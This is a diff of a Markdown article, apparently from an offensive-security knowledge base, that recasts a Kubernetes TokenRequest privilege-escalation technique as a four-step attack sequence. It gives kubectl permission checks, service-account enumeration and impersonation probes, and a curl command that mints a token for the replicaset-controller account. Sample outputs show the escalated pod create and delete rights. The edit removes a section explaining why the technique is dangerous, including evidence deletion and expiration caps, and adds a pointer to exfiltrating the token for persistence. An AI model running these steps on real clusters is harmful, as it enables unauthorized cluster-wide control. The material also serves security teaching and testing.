@@ -31,7 +31,7 @@ The TokenRequest API issues short-lived tokens on demand. The API endpoint is:
 POST /api/v1/namespaces/<namespace>/serviceaccounts/<name>/token
 ```
 
-A caller sends a `TokenRequest` specifying how long the token should live and which audiences it should be valid for:
+A caller sends a `TokenRequest` body specifying how long the token should live and which audiences it should be valid for:
 
 ```json
 {
@@ -48,7 +48,9 @@ The `spec` also accepts an optional `boundObjectRef` field that ties the resulti
 
 A caller with `create` on the `serviceaccounts/token` subresource can call this endpoint for any service account the RBAC rule covers, not just its own. The token is generated in memory and never written to etcd — no Secret object is created and the credential cannot be retrieved after the API response is returned. The API server has no requirement that the requester and the target be the same identity, which means any over-permissive grant of the subresource becomes an impersonation primitive.
 
-## RBAC permissions required
+## Required permission
+
+The minimum RBAC rule that enables this technique is:
 
 ```yaml
 rules:
@@ -57,40 +59,54 @@ rules:
     verbs: ["create"]
 ```
 
-This is the minimum needed. The attacker does not need `get` on `serviceaccounts`, `create` on `pods`, or access to `secrets`.
+The attacker does not need `get` on `serviceaccounts`, `create` on `pods`, or access to `secrets`. This single rule is sufficient to request a token for any service account in the namespace unless `resourceNames` is used to restrict the scope.
 
-When checking this permission with `kubectl auth can-i`, the slash notation returns a misleading `no`. `kubectl auth can-i` submits a `SelfSubjectAccessReview` to the API server. The slash form (`serviceaccounts/token`) populates only the `resource` field of the review spec, leaving the `subresource` field empty. The API server evaluates the review with no subresource set, which does not match the actual RBAC rule. The `--subresource` flag is required to populate the correct field:
+## The attack sequence
+
+### Step 1: Verify the permission
+
+Before attempting the token request, confirm that the current identity holds the required permission. `kubectl auth can-i` submits a `SelfSubjectAccessReview` to the API server. The slash form (`serviceaccounts/token`) populates only the `resource` field of the review spec, leaving the `subresource` field empty. The API server evaluates the review with no subresource set, which does not match the actual RBAC rule. The `--subresource` flag is required to populate the correct field. The slash form returns a misleading `no`:
 
 ```bash
 kubectl auth can-i create serviceaccounts/token -n <namespace>
 ```
 
+```output
+no
+```
+
+The correct check uses `--subresource`:
+
 ```bash
 kubectl auth can-i create serviceaccounts --subresource=token -n <namespace>
 ```
 
-## Identifying privileged targets
+```output
+yes
+```
 
-Enumeration is not always necessary. Several service accounts exist by default in every Kubernetes cluster and are worth targeting directly without any prior discovery.
+### Step 2: Identify a privileged target
+
+Enumeration is not always necessary. Several service accounts exist by default in every Kubernetes cluster and are worth targeting directly without prior discovery.
 
 The `default` service account is present in every namespace. Operators who do not create dedicated service accounts for their workloads often bind roles directly to `default`, making it a reliable first target.
 
 In `kube-system`, service accounts such as `replicaset-controller`, `deployment-controller`, and `horizontal-pod-autoscaler` are created by the cluster itself and hold broad permissions over their respective resources. These names are fixed across all standard Kubernetes installations and can be targeted without any prior enumeration.
 
-When SA names are not known in advance, listing service accounts in the namespace reveals the full set of candidates:
+When service account names are not known in advance, list all candidates in the namespace:
 
 ```bash
 kubectl get serviceaccounts -n <namespace> -o name
 ```
 
-To identify which candidates hold useful permissions without access to rolebindings, probe using impersonation:
+To identify which candidates hold useful permissions without access to RoleBindings, probe using impersonation:
 
 ```bash
 kubectl auth can-i --list -n <namespace> \
   --as=system:serviceaccount:<namespace>:<candidate-sa>
 ```
 
-## The escalation path
+### Step 3: Request the token
 
 The target in this scenario is `replicaset-controller` in `kube-system`, a service account present in every standard Kubernetes installation. It is bound to the `system:controller:replicaset-controller` ClusterRole, which grants `create` and `delete` on pods across all namespaces:
 
@@ -129,7 +145,7 @@ rules:
     resourceNames: ["replicaset-controller"]
 ```
 
-From inside a pod with this permission, the token request goes directly to the API server using the pod's auto-mounted credential:
+From inside a pod with this permission, use the auto-mounted credential to call the TokenRequest API directly. The `kubernetes.default.svc` DNS name may not resolve in all pod configurations — using the `KUBERNETES_SERVICE_HOST` and `KUBERNETES_SERVICE_PORT` environment variables is the reliable path:
 
 ```bash
 APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
@@ -142,6 +158,19 @@ curl -s -X POST \
   -H "Authorization: Bearer ${TOKEN}" \
   -H "Content-Type: application/json" \
   -d '{"apiVersion":"authentication.k8s.io/v1","kind":"TokenRequest","spec":{"expirationSeconds":3600}}'
+```
+
+A successful request returns HTTP 201 with the token in `status.token`:
+
+```output
+{
+  "kind": "TokenRequest",
+  "apiVersion": "authentication.k8s.io/v1",
+  "status": {
+    "token": "eyJhbGciOiJSUzI1NiIsImtpZCI6...",
+    "expirationTimestamp": "2026-04-12T10:14:03Z"
+  }
+}
 ```
 
 The returned token is signed by the API server's `--service-account-signing-key-file`. Its JWT payload contains:
@@ -158,38 +187,28 @@ The returned token is signed by the API server's `--service-account-signing-key-
 | `nbf` | not-before time, equal to `iat` |
 | `jti` | unique token identifier |
 
-Verifying the permission difference using impersonation:
+### Step 4: Verify the escalation
+
+Confirm the permission difference between the attacker's own identity and the retrieved token. The attacker's own service account has no pod creation permission:
 
 ```bash
 kubectl auth can-i create pods -n default \
   --as=system:serviceaccount:default:default
+```
 
+```output
+no
+```
+
+The retrieved token carries cluster-wide pod creation and deletion:
+
+```bash
 kubectl auth can-i create pods -n default \
   --as=system:serviceaccount:kube-system:replicaset-controller
 ```
 
-The retrieved token carries the `replicaset-controller` identity with cluster-wide pod creation and deletion capability.
-
-## Why this is dangerous
-
-The TokenRequest API is designed to replace long-lived auto-mounted tokens. The permission is therefore present in clusters that follow the modern token model. What makes it dangerous is scope: a role that grants `create` on `serviceaccounts/token` without a `resourceNames` restriction allows token generation for every service account in the namespace, not just the requester's own.
-
-The token is ephemeral. After its expiry time there is nothing left in the cluster.
-
-The curl command above does not include a `boundObjectRef` in the request spec. Without it the token is not tied to any pod lifetime and remains valid for the full `expirationSeconds` duration even after the pod that requested it is deleted. An attacker can retrieve the token, delete the attacking pod to remove the immediate evidence, and continue using the token externally until it expires.
-
-The difference is observable by comparing the API server response for each case after the originating pod is deleted:
-
-```bash
-# Unbound token — 403 Forbidden (authenticated, token accepted, no list permission)
-curl -sk https://<apiserver>/api/v1/namespaces/<namespace>/serviceaccounts \
-  -H "Authorization: Bearer <unbound-token>"
-
-# Bound token — 401 Unauthorized (token rejected, bound pod no longer exists)
-curl -sk https://<apiserver>/api/v1/namespaces/<namespace>/serviceaccounts \
-  -H "Authorization: Bearer <bound-token>"
+```output
+yes
 ```
 
-A 403 means the API server accepted the credential and evaluated RBAC. A 401 means it rejected the token before reaching authorization. When `boundObjectRef` is present, the API server's token authenticator validates on every incoming request that the referenced object still exists. This check runs before RBAC evaluation. If the bound object is gone, the API server rejects the token in the authenticator before authorization is attempted, which is why the bound token produces 401 rather than 403. Once the bound pod is deleted, the bound token is permanently dead regardless of its `exp` claim.
-
-When `--service-account-max-token-expiration` is not set on the API server, there is no ceiling. The API server accepts any value, requesting 99999999 seconds produces a token valid to 2029. Setting the flag caps all issued tokens to the configured maximum regardless of what the caller requests. Requesting a long-lived token before detection means the credential survives rotation of the attacking pod's own service account.
+Once the escalated token is in hand, it can be exfiltrated and used to maintain access from outside the cluster without leaving any in-cluster footprint. That lifecycle — exfiltration, pod deletion, and external persistence — is covered in [Persistence via Unbound Service Account Tokens](/topics/persistence-via-unbound-serviceaccount-tokens).
